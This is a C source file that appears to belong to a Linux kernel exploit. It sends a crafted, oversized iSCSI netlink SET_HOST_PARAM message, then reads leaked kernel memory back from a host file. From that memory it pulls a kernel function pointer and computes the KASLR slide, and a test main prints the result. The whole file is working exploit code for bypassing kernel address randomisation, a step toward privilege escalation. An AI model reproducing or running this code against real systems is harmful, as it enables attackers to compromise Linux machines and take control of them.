#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <sched.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/un.h>
#include <syscall.h>
#include <unistd.h>

#include "iscsi_if.h"
#include "common.h"
#include "symbols.h"

#define NUM_EXTRA_BYTES 656

uint64_t get_kernel_slide(uint32_t hostno, uint32_t sid, int sock_fd, uint64_t handle)
{
	int fd, leaked_bytes, msg_size;
	unsigned char * data;
	struct nlmsghdr *nlh = NULL;
	struct iscsi_uevent * ev;
	unsigned char read_buffer[1024];
	uint64_t slide, leaked_kernel_function = 0;

	//Setup the netlink message header
	msg_size = sizeof(*nlh) + sizeof(struct iscsi_uevent) + NUM_EXTRA_BYTES;
	nlh = (struct nlmsghdr *)malloc(MSG_SIZE);
	memset(nlh, 0, msg_size);
	nlh->nlmsg_len = msg_size;
	nlh->nlmsg_pid = getpid();
	nlh->nlmsg_flags = NLM_F_REQUEST;
	nlh->nlmsg_type = ISCSI_UEVENT_SET_HOST_PARAM;

	//Send the create connection message
	ev = (struct iscsi_uevent *)NLMSG_DATA(nlh);
	ev->type = ISCSI_UEVENT_SET_HOST_PARAM;
	ev->iferror = 0;
	ev->transport_handle = handle;
	ev->u.set_host_param.host_no = hostno;
	ev->u.set_host_param.param = ISCSI_HOST_PARAM_INITIATOR_NAME;
	ev->u.set_host_param.len = 0x100;

	data  = (unsigned char *)nlh + sizeof(*nlh) + sizeof(struct iscsi_uevent);
	memset(data, 0xAA, NUM_EXTRA_BYTES);

	sleep(1);

	//Send the message and read the response
	send_netlink_msg_sized(sock_fd, nlh, msg_size);
	read_response(sock_fd, nlh);

	//Get the leaked bytes
	fd = iscsi_get_file(hostno);
	memset(read_buffer, 0, sizeof(read_buffer));
	leaked_bytes = read(fd, read_buffer, sizeof(read_buffer));
	close(fd);

	//Parse the leaked bytes
	memcpy(&leaked_kernel_function, read_buffer + NUM_EXTRA_BYTES, sizeof(leaked_kernel_function));
	if(leaked_kernel_function == 0)
		return -1;
	slide = leaked_kernel_function - NETLINK_SOCK_DESTRUCT;
	//printf("slide = 0x%llx, mask = 0x%x, with mask 0x%llx\n", slide, 0xfff, slide & 0xfff);
	if((slide & 0xfff) != 0)
		return -1;
	return slide;
}

#ifdef LEAK_TEST

int main(int argc, char **argv) {
	int sock_fd;
	uint32_t hostno, sid;
	uint64_t handle, slide;

	bind_cpu();

	if(setup_iscsi(0, &hostno, &sid, &sock_fd, &handle)) {
		return 1;
	}

	slide = get_kernel_slide(hostno, sid, sock_fd, handle);
	printf("Kernel slide = 0x%lx\n", slide);

	return 0;
}

#endif
